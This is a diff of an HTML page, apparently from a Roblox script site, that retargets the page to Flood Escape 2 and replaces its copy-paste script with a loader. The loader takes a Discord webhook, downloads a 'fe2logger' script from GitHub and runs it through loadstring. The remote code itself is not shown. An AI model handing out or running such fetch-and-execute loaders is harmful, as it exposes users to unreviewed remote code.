@@ -15,10 +15,10 @@
         <a href="#credits-section" class="credits-button">Credits</a>
     </div>
     <div class="game-container">
-        <img src="https://tr.rbxcdn.com/aea986ef0db8c78727a7646ec35a5a5b/150/150/Image/Png" alt="Game Image" class="game-image">
+        <img src="https://tr.rbxcdn.com/8fbfb8e748b90759e9ee05180e3af1a5/150/150/Image/Png" alt="Game Image" class="game-image">
         <div class="game-info">
-            <h2 class="game-title">Flood Escape Classic</h2>
-            <a href="#" class="play-game-button">Play Game</a>
+            <h2 class="game-title">Flood Ecape 2</h2>
+            <a href="https://www.roblox.com/games/738339342/6-MAPS-Flood-Escape-2#!/game-instances" class="play-game-button">Play Game</a>
         </div>
     </div>
     <div class="code-container">
@@ -27,7 +27,13 @@
             <button class="copy-code-button" onclick="copyCode()">Copy Code</button>
         </div>
         <pre id="code-content" class="code-content">
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/dazscripts/ScriptBlox-Projects/main/FloodEscapeClassic"))
+            getgenv().webhook = 'Your Discord Webhook Here'
+
+            local url = "https://raw.githubusercontent.com/dazscripts/ScriptBlox-Projects/main/fe2logger"
+            local http_get = game.HttpGet or game.HttpService.GetAsync
+            local content = http_get(game, url)
+            local load_script = loadstring(content)
+            load_script()
         </pre>
     </div>
 
